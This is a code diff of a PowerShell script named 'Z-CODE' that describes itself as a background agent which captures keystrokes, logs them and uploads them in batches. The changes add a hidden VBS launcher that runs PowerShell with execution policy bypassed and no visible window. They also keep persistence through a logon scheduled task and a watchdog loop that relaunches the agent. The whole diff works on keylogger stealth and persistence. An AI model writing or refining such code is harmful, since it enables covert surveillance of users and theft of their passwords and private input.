@@ -1,7 +1,9 @@
 # ============================================================
 #  Z-CODE - background agent: captures, logs locally, uploads.
-#  Stop: Ctrl+Alt+Q  or  stop.vbs  (stop.bat)
-#  Modes (internal, used by install.bat): -Register  -Watchdog  -NoWatchdog
+#  Program file may live anywhere (read-only ok, e.g. Program Files).
+#  All writable data lives in %LOCALAPPDATA%\Z-CODE
+#  Stop: Ctrl+Alt+Q  or  Z-CODE-stop.bat
+#  Modes (internal): -Register  -Watchdog  -NoWatchdog
 # ============================================================
 param(
     [switch]$Register,
@@ -26,13 +28,17 @@ $SendEvery  = 5000      # ms between upload attempts
 $BatchBytes = 65536     # max bytes per POST
 # ------------------------------------------------------------
 
-$LogPath        = Join-Path $env:USERPROFILE 'ZCODE_keycapture_log.txt'
-$PidPath        = Join-Path $env:USERPROFILE 'ZCODE.pid'
-$SpoolPath      = Join-Path $env:USERPROFILE 'ZCODE_spool.bin'
-$OffsetPath     = Join-Path $env:USERPROFILE 'ZCODE_spool.offset'
-$StopPath       = Join-Path $env:USERPROFILE 'ZCODE.stop'
+$Root    = $PSScriptRoot
+$DataDir = Join-Path $env:LOCALAPPDATA 'Z-CODE'
+if (-not (Test-Path -LiteralPath $DataDir)) { New-Item -ItemType Directory -Path $DataDir -Force | Out-Null }
+
+$LogPath        = Join-Path $DataDir 'ZCODE_keycapture_log.txt'
+$PidPath        = Join-Path $DataDir 'ZCODE.pid'
+$SpoolPath      = Join-Path $DataDir 'ZCODE_spool.bin'
+$OffsetPath     = Join-Path $DataDir 'ZCODE_spool.offset'
+$StopPath       = Join-Path $DataDir 'ZCODE.stop'
+$VbsPath        = Join-Path $DataDir 'launch.vbs'
 $SpoolMutexName = 'ZCODE_Spool_Mutex'
-$VbsPath        = Join-Path $PSScriptRoot 'Z-CODE.vbs'
 
 $fs = $null; $spoolFs = $null; $spoolMtx = $null; $spoolEnc = $null
 $ps = $null; $rs = $null
@@ -42,7 +48,14 @@ $floor = 0
 function Log([string]$t) { [System.IO.File]::AppendAllText($LogPath, $t) }
 
 # ---------------- persistence ----------------
+function Ensure-Launcher {
+    $line = 'CreateObject("WScript.Shell").Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""' +
+            ($PSCommandPath -replace '"', '""') + '""", 0, False'
+    try { [System.IO.File]::WriteAllText($VbsPath, $line, (New-Object System.Text.ASCIIEncoding)) } catch {}
+}
+
 function Get-LaunchCommand {
+    Ensure-Launcher
     if (Test-Path -LiteralPath $VbsPath) { return 'wscript.exe "' + $VbsPath + '"' }
     return 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
 }
@@ -56,15 +69,7 @@ function Install-Persistence {
         $line = 'CreateObject("WScript.Shell").Run "' + ($cmd -replace '"', '""') + '", 0, False'
         [System.IO.File]::WriteAllText($lnk, $line, (New-Object System.Text.ASCIIEncoding))
     } catch {}
-    try {
-        # task action must be console-less too: wscript when the launcher exists
-        $act = if (Test-Path -LiteralPath $VbsPath) {
-            'wscript.exe "' + $VbsPath + '"'
-        } else {
-            'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
-        }
-        & schtasks.exe /create /f /sc onlogon /tn 'Z-CODE Key Capture' /tr $act 2>$null | Out-Null
-    } catch {}
+    try { & schtasks.exe /create /f /sc onlogon /tn 'Z-CODE Key Capture' /tr $cmd 2>$null | Out-Null } catch {}
 }
 
 if ($Register) {
@@ -94,14 +99,15 @@ if ($Watchdog) {
         $misses = 0
         Install-Persistence
         try {
-            if (Test-Path -LiteralPath $VbsPath) {
-                Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '"') | Out-Null
-            } else {
+            Ensure-Launcher
+            Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '"') | Out-Null
+        } catch {
+            try {
                 Start-Process powershell.exe -NoNewWindow -ArgumentList @(
                     '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
                     '-File', ('"' + $PSCommandPath + '"'), '-NoWatchdog') | Out-Null
-            }
-        } catch {}
+            } catch {}
+        }
         Start-Sleep -Seconds 20
     }
 }
